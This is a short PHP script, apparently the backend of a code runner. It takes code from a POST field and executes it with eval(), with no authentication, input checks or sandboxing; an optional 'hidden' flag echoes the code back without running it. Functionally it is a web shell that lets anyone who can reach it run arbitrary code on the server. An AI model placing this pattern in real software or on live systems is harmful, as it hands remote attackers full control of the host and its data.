<?php
error_reporting(E_ALL | E_STRICT);
$code = $_POST['code'];
$code = get_magic_quotes_gpc() ? stripslashes($code) : $code;
if (isset($_POST['hidden']) && $_POST['hidden'] == 1) {
    echo $code;
    exit();
} else {
    date_default_timezone_set('PRC');
    echo eval($code);
    exit();
}
?>